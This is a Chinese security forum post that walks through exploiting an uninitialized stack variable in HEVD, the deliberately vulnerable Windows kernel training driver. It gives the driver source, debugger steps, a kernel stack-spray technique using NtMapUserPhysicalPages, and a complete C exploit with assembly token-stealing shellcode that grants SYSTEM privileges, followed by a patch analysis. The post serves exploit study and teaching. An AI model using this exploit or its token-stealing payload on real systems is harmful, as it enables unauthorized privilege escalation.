> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.pediy.com](https://bbs.pediy.com/thread-270396.htm)

> [原创] 内核漏洞学习 [6]-HEVD-UninitializedStackVariable

﻿﻿﻿﻿# HEVD-UninitializedStackVariable

一： 概述
-----

HEVD：漏洞靶场，包含各种 Windows 内核漏洞的驱动程序项目，在 Github 上就可以找到该项目，进行相关的学习

 

[Releases · hacksysteam/HackSysExtremeVulnerableDriver · GitHub](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/releases)

> 环境准备：
> 
> Windows 7 X86 sp1 虚拟机
> 
> 使用 VirtualKD 和 windbg 双机调试
> 
> HEVD 3.0+KmdManager+DubugView

[](#二：漏洞点分析)二：漏洞点分析
-------------------

TriggerUninitializedMemoryStack 函数存在漏洞，内核函数栈中的变量未初始化，如果用户传入的 UserValue==MagicValue(0xBAD0B0B0), 就会赋值参数 value 和回调函数 callback 地址，并在后面调用 callback。如果 uservalue 不等 MagicValue，就存在利用点。

 

在非安全版本中 UninitializedMemory 变量定义但是没有初始化，由于该变量布局在栈上，它会拥有一个之前调用函数遗留的随机垃圾值。

 

源码：

```
NTSTATUS
TriggerUninitializedMemoryStack(
    _In_ PVOID UserBuffer
)
{
    ULONG UserValue = 0;
    ULONG MagicValue = 0xBAD0B0B0;
    NTSTATUS Status = STATUS_SUCCESS;
 
#ifdef SECURE
    //
    // Secure Note: This is secure because the developer is properly initializing
    // UNINITIALIZED_MEMORY_STACK to NULL and checks for NULL pointer before calling
    // the callback
    //
 
    UNINITIALIZED_MEMORY_STACK UninitializedMemory = { 0 };//安全版本： 栈变量初始化了
#else
    //
    // Vulnerability Note: This is a vanilla Uninitialized Memory in Stack vulnerability
    // because the developer is not initializing 'UNINITIALIZED_MEMORY_STACK' structure
    // before calling the callback when 'MagicValue' does not match 'UserValue'
    //
 
    UNINITIALIZED_MEMORY_STACK UninitializedMemory;//不安全版本： 栈变量未初始化
#endif
 
    PAGED_CODE();
 
    __try
    {
        //
        // Verify if the buffer resides in user mode
        //
 
        ProbeForRead(UserBuffer, sizeof(UNINITIALIZED_MEMORY_STACK), (ULONG)__alignof(UCHAR));
 
        //
        // Get the value from user mode
        //
 
        UserValue = *(PULONG)UserBuffer;
 
        DbgPrint("[+] UserValue: 0x%p\n", UserValue);
        DbgPrint("[+] UninitializedMemory Address: 0x%p\n", &UninitializedMemory);
 
        //
        // Validate the magic value
        //
 
        if (UserValue == MagicValue) {
            UninitializedMemory.Value = UserValue;
            UninitializedMemory.Callback = &UninitializedMemoryStackObjectCallback;
        }
 
        DbgPrint("[+] UninitializedMemory.Value: 0x%p\n", UninitializedMemory.Value);
        DbgPrint("[+] UninitializedMemory.Callback: 0x%p\n", UninitializedMemory.Callback);
 
#ifndef SECURE
        DbgPrint("[+] Triggering Uninitialized Memory in Stack\n");
#endif
 
        //
        // Call the callback function
        //
 
        if (UninitializedMemory.Callback)//在此处判断回调函数是否为0，否则可利用0页内存，
        {
            UninitializedMemory.Callback();
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        Status = GetExceptionCode();
        DbgPrint("[-] Exception Code: 0x%X\n", Status);
    }
 
    return Status;
}

```

逆向 HEVD.sys  
![](https://bbs.pediy.com/upload/attach/202111/921642_JRK88RA9WBFTK8J.jpg)

 

if (UninitializedMemory.Callback) // 此处判断回调函数是否为空，否则含有空指针漏洞，可利用在 0 页内存上构造 payload，相关 HEVD：

 

[[原创] 内核漏洞学习 [5]-HEVD-NullPointerDereference - 二进制漏洞 - 看雪论坛 - 安全社区 | 安全招聘 | bbs.pediy.com](https://bbs.pediy.com/thread-270246.htm)

 

那么既然有判断，就要换个方法，回调函数地址修改为不为 0 的地址，然后该地址指向 payoad，

[](#三：漏洞利用)三：漏洞利用
-----------------

HEVD_IOCTL_UNINITIALIZED_MEMORY_STACK 控制码对应的派遣函数 UninitializedMemoryStackIoctlHandlercase

```
case HEVD_IOCTL_UNINITIALIZED_MEMORY_STACK:
DbgPrint("****** HEVD_IOCTL_UNINITIALIZED_MEMORY_STACK ******\n");
Status = UninitializedMemoryStackIoctlHandler(Irp, IrpSp);
DbgPrint("****** HEVD_IOCTL_UNINITIALIZED_MEMORY_STACK ******\n");
break;

```

UninitializedMemoryStackIoctlHandlercase 函数调用 TriggerUninitializedMemoryStack 触发漏洞

 

逆向获得 IO 控制码 0x22202f

 

![](https://bbs.pediy.com/upload/attach/202111/921642_4FE5JJXYSGQBY39.jpg)

 

sub_4460E8-->sub_445FFA(漏洞函数)

 

（1）测试

```
#include #include HANDLE hDevice = NULL;
 
#define HEVD_IOCTL_UNINITIALIZED_MEMORY_STACK CTL_CODE(FILE_DEVICE_UNKNOWN, 0x80B, METHOD_NEITHER, FILE_ANY_ACCESS)
//#define HEVD_IOCTL_UNINITIALIZED_MEMORY_STACK                    IOCTL(0x80B)
int main()
 
{
 
    hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE,
        NULL,
        NULL,
        OPEN_EXISTING,
        NULL,
        NULL
        );
    if (hDevice == INVALID_HANDLE_VALUE || hDevice == NULL)
    {
        printf("[-]failed to get device handle !");
        return FALSE;
 
    }
    printf("[+]success to get device  handle");
 
    if (hDevice) {
 
        DWORD bReturn = 0;
        char buf[4] = { 0 };
        *(PDWORD32)(buf) = 0xBAD0B0B0;
 
        DeviceIoControl(hDevice, 0x22202f, buf, 4, NULL, 0, &bReturn, NULL);
    }
 
 
 
} 
```

因为 uservalue=0xBAD0B0B0，所以打印出信息，

 

![](https://bbs.pediy.com/upload/attach/202111/921642_58X3WMZYE8KAXSB.jpg)

 

*(PDWORD32)(buf) = 0x12345678;

 

将值修改为 0x12345678, 再次运行

 

我们传入值与 MagicValue 值不匹配时，则会触发漏洞

 

![](https://bbs.pediy.com/upload/attach/202111/921642_6VDJ8EHGPKAQ399.jpg)

 

在 cmp 处下断点，

 

![](https://bbs.pediy.com/upload/attach/202111/921642_ZRQ7V275G4AUS9H.jpg)

 

HEVD!TriggerUninitializedMemoryStack 偏移 0x53 处，下断点，运行

```
kd> bp HEVD!TriggerUninitializedMemoryStack+0x53
kd> g

```

执行我们的测试 exp 断下来后查看

 

![](https://bbs.pediy.com/upload/attach/202111/921642_2R6F6WSHCFRV886.jpg)

 

![](https://bbs.pediy.com/upload/attach/202111/921642_FH2FZ9YXWH665CX.jpg)

 

stack_init-callback=94083ed0-940839cc=504(1284 bytes)

 

![](https://bbs.pediy.com/upload/attach/202111/921642_96V23QKV9682A55.jpg)

 

如果我们比较失败了，继续下行调用函数的时候，我们调用的将是一个内核栈上的垃圾值！此值是不固定的，它会拥有一个之前调用函数遗留的随机垃圾值。

 

我们已经知道了该变量距离当前栈起始位置有多远，在驱动程序源代码中看到，易受攻击的代码被 try/except 包围，目标操作系统不会崩溃。无法用测试 exp 触发系统 BSOD，

 

现在，如果我们可以将**攻击者控制**的数据放在与 **Stack Init 0x504** 的偏移处，我们就可以劫持**指令指针**。

 

如何从用户模式将用户控制的数据放在内核堆栈上？

 

看 j00ru](https://j00ru.vexillium.org/2011/05/windows-kernel-stack-spraying-techniques/)) 写的方法，官方 exp 和 fuzzysecurity 用的都是 NtMapUserPhysicalPages 函数，它的一部分功能是拷贝输入的字节到内核栈上的一个本地缓冲区。最大尺寸可以拷贝 1024*IntPtr::Size(32 位机器上是 4 字节）=>4096 字节，函数的栈最大也就 4096byte，所以传 4096 大小就可以占满一页内存，我们将所有内容都写成 payload 的地址

#### 详细解释栈喷射

nt!NtMapUserPhysicalPages

```
mov     edi, edi
push    ebp
mov     ebp, esp
push    0FFFFFFFFh
push    offset dword_452498
push    offset __except_handler3
mov     eax, large fs:0
push    eax
mov     large fs:0, esp
push    ecx
push    ecx
mov     eax, 10E8h
call    __chkstk

```

鉴于 __chkstk 是一个特殊的过程，它将堆栈指针降低给定的字节数——这里是 0x10e8——该函数肯定会使用大量的本地存储（不止一个，典型的内存页！）

```
NTSTATUS
 ``NtMapUserPhysicalPages (
  ``__in ``PVOID` `VirtualAddress,
  ``__in ``ULONG_PTR` `NumberOfPages,
  ``__in_ecount_opt(NumberOfPages) ``PULONG_PTR` `UserPfnArray
 ``)
(...)
 ``ULONG_PTR` `StackArray[COPY_STACK_SIZE];
 #define COPY_STACK_SIZE             1024 //用作缓冲区

```

NtMapUserPhysicalPages 调用 MiCaptureUlongPtrArray

```
PoolArea = (PVOID)&StackArray[0];
 
(...)
 
  if (NumberOfPages > COPY_STACK_SIZE) {
    PoolArea = ExAllocatePoolWithTag (NonPagedPool,
                                      NumberOfBytes,
                                      'wRmM');
 
    if (PoolArea == NULL) {
      return STATUS_INSUFFICIENT_RESOURCES;
    }
  }
 
(...)
 
  Status = MiCaptureUlongPtrArray (PoolArea,
                                   UserPfnArray,
                                   NumberOfPages);

```

NtMapUserPhysicalPages 函数分配一个包含 1024 的单位的本地缓冲区（就是该函数栈的缓冲区）可以在本地存储多达 4096（1024*sizeof(ULONG_PTR)） 个用户提供的字节（正好是一个内存页），

 

调用 NtMapUserPhysicalPages 之前的内核堆栈

 

![](https://bbs.pediy.com/upload/attach/202111/921642_92QF9YEC6XDBPKZ.jpg)

 

调用 NtMapUserPhysicalPages 之后的堆栈布局

 

![](https://bbs.pediy.com/upload/attach/202111/921642_AC65R6QSYT5MQMN.jpg)

 

我们之前已经算出来，未初始化变量的 callback 距离 stack_init 偏移 0x504 大小

 

那么我们的 exp 先调用 NtMapUserPhysicalPages 函数将我们的 payload 地址写入缓冲区，共写入 4096 字节大小，那么在我们调用漏洞函数，进而调用 callback 使，我们的 callback 值就是文章最开始说的 **“在非安全版本中 UninitializedMemory 变量定义但是没有初始化，由于该变量布局在栈上，它会拥有一个之前调用函数遗留的随机垃圾值”** 所以调用 callback，就会执行我们构造的 payload

 

（2）漏洞利用

 

exp，可供参考

```
#include #include HANDLE hDevice = NULL;
typedef NTSTATUS(WINAPI* My_NtMapUserPhysicalPages)(
    IN PVOID          VirtualAddress,
    IN ULONG_PTR      NumberOfPages,
    IN OUT PULONG_PTR UserPfnArray);
#define HEVD_IOCTL_UNINITIALIZED_MEMORY_STACK CTL_CODE(FILE_DEVICE_UNKNOWN, 0x80B, METHOD_NEITHER, FILE_ANY_ACCESS)
void payload()
{
    ..
}
int main()
 
{
 
    hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE,
        NULL,
        NULL,
        OPEN_EXISTING,
        NULL,
        NULL
    );
    if (hDevice == INVALID_HANDLE_VALUE || hDevice == NULL)
    {
        printf("[-]failed to get device handle \n");
        return FALSE;
 
    }
    printf("[+]success to get device  handle\n");
 
    if (hDevice) {
 
        DWORD bReturn = 0;
        char buf[4] = { 0 };
        *(PDWORD32)(buf) = 0x12345678;
 
        //栈喷射
 
        My_NtMapUserPhysicalPages NtMapUserPhysicalPages = (My_NtMapUserPhysicalPages)GetProcAddress(
            GetModuleHandle(L"ntdll"),
            "NtMapUserPhysicalPages");
 
        if (NtMapUserPhysicalPages == NULL)
        {
            printf("[+]Failed to get MapUserPhysicalPages\n");
            return;
        }
 
        PDWORD KernelStackSpray = (PDWORD)malloc(4096);
        memset(KernelStackSpray, 0x41, 4096);
 
        printf("[+]KernelStackSpray: 0x%p\n", KernelStackSpray);
 
        for (int i = 0; i < 1024; i++)
        {
            *(PDWORD)(KernelStackSpray + i) = (DWORD)&payload;
        }
 
        NtMapUserPhysicalPages(NULL, 1024, KernelStackSpray);
 
        //触发漏洞，执行payload
        DeviceIoControl(hDevice, HEVD_IOCTL_UNINITIALIZED_MEMORY_STACK, buf, 4, NULL, 0, &bReturn, NULL);
        //cmd
        printf("[+]Start to Create cmd...\n");
        STARTUPINFO si = { sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_SHOW;
        WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
        BOOL Return = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
        if (Return) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
        system("pause");
        return 0;
 
    }
 
 
 
} 
```

 

payload 功能：遍历进程，得到系统进程的 token，把当前进程的 token 替换，达到提权目的。

 

相关内核结构体：

 

在内核模式下，fs:[0] 指向 KPCR 结构体

```
_KPCR
+0x120 PrcbData         : _KPRCB
_KPRCB
+0x004 CurrentThread    : Ptr32 _KTHREAD，_KTHREAD指针，这个指针指向_KTHREAD结构体
_KTHREAD
+0x040 ApcState         : _KAPC_STATE
_KAPC_STATE
+0x010 Process          : Ptr32 _KPROCESS,_KPROCESS指针，这个指针指向EPROCESS结构体
_EPROCESS
   +0x0b4 UniqueProcessId  : Ptr32 Void,当前进程ID，系统进程ID=0x04
   +0x0b8 ActiveProcessLinks : _LIST_ENTRY，双向链表，指向下一个进程的ActiveProcessLinks结构体处，通过这个链表我们可以遍历所有进程，以寻找我们需要的进程
   +0x0f8 Token            : _EX_FAST_REF，描述了该进程的安全上下文，同时包含了进程账户相关的身份以及权限

```

payload：

```
VOID payload()
{
    __asm {
        pushad                               ; Save registers state
 
        ; Start of Token Stealing Stub
        xor eax, eax                         ; Set ZERO
        mov eax, fs:[eax + KTHREAD_OFFSET]   ; Get nt!_KPCR.PcrbData.CurrentThread
                                             ; _KTHREAD is located at FS:[0x124]
 
        mov eax, [eax + EPROCESS_OFFSET]     ; Get nt!_KTHREAD.ApcState.Process
 
        mov ecx, eax                         ; Copy current process _EPROCESS structure
 
        mov edx, SYSTEM_PID                  ; WIN 7 SP1 SYSTEM process PID = 0x4
 
        SearchSystemPID:
            mov eax, [eax + FLINK_OFFSET]    ; Get nt!_EPROCESS.ActiveProcessLinks.Flink
            sub eax, FLINK_OFFSET
            cmp [eax + PID_OFFSET], edx      ; Get nt!_EPROCESS.UniqueProcessId
            jne SearchSystemPID
 
        mov edx, [eax + TOKEN_OFFSET]        ; Get SYSTEM process nt!_EPROCESS.Token
        mov [ecx + TOKEN_OFFSET], edx        ; Replace target process nt!_EPROCESS.Token
                                             ; with SYSTEM process nt!_EPROCESS.Token
        ; End of Token Stealing Stub
 
        popad                                ; Restore registers state
        ret
    }
}

```

运行 exp, 喷射成功，提权成功：

 

![](https://bbs.pediy.com/upload/attach/202111/921642_NE4VC27FQ23SRA4.jpg)

 

![](https://bbs.pediy.com/upload/attach/202111/921642_USJWCXFFJ4C68B9.jpg)

 

注意：我们从用户模式控制内核堆栈上的数据。必须防止它被其他函数调用破坏。

 

为此，我们需要防止任何其他函数使用内核堆栈。只需确保在喷射内核栈并触发漏洞后不执行或调用任何其他函数即可。

[](#四：补丁分析)四：补丁分析
-----------------

内核函数栈中的变量定义后，进行初始化，比如源码给的安全版本：

```
UNINITIALIZED_MEMORY_STACK UninitializedMemory = { 0 };

```

[](#五：参考文档)五：参考文档
-----------------

[nt!NtMapUserPhysicalPages and Kernel Stack-Spraying Techniques | j00ru//vx tech blog (vexillium.org)](https://j00ru.vexillium.org/2011/05/windows-kernel-stack-spraying-techniques/)

 

[Seebug](https://paper.seebug.org/200/)

 

[未初始化的堆栈变量 – Windows 内核开发 (payatu.com)](https://payatu.com/uninitialized-stack-variable)

 

[[原创]Windows Kernel Exploit 内核漏洞学习 (6)- 未初始化栈利用 - 二进制漏洞 - 看雪论坛 - 安全社区 | 安全招聘 | bbs.pediy.com](https://bbs.pediy.com/thread-253369.htm)

 

[[翻译]Windows exploit 开发系列教程第十三部分：内核利用程序之未初始化栈变量 - 外文翻译 - 看雪论坛 - 安全社区 | 安全招聘 | bbs.pediy.com](https://bbs.pediy.com/thread-225179.htm)  
ps：因为是自己边学习别记录的，就看着有点啰嗦？？？但是感觉写的很好理解。。

[【公告】【iPhone 13、ipad、iWatch】11 月 15 日中午 12：00，看雪 · 众安 2021 KCTF 秋季赛 正式开赛【攻击篇】！！！文末有惊喜～](https://bbs.pediy.com/thread-270218.htm)

最后于 16 小时前 被 pyikaaaa 编辑 ，原因：

[#漏洞分析](forum-150-1-153.htm) [#漏洞利用](forum-150-1-154.htm) [#Windows](forum-150-1-160.htm)